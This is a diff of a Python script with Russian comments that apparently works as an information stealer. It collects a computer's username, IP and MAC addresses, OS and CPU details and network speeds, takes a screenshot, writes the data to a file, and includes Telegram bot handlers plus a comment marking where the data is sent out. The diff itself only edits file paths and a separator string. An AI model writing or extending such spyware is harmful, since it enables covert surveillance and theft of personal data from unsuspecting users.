@@ -44,7 +44,7 @@ cpu = psutil.cpu_freq()
 os.getcwd()
 
 try: # Перехватывает ошибки в случае неверно указанного расположения
-    os.chdir(r'C:/temp/path')
+    os.chdir(r'D:/temp/path')
 except OSError:
     @bot.message_handler(commands=['start'])
     def start_message(message): # Служебная обвязка для бота
@@ -58,7 +58,7 @@ screen = pyautogui.screenshot('screenshot.jpg') # Снятие скриншот�
 
 # Запись в файл
 try: # Обвязка для обработки команд боту
-    os.chdir(r'C:/temp/path')
+    os.chdir(r'D:/temp/path')
 except OSError:
     @bot.message_handler(commands=['start'])
     def start_message(message):
@@ -72,7 +72,7 @@ ends = datetime.now() # Конец отчета
 workspeed = format(ends - start) # Вычисление времени
 
 file = open('info.txt', 'w') # Открываем файл
-file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
+file.write(f"[{'='*50}]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[{'='*50}]\n")
 file.close() # Закрываем
 
 # Отправка данных (скриншота)
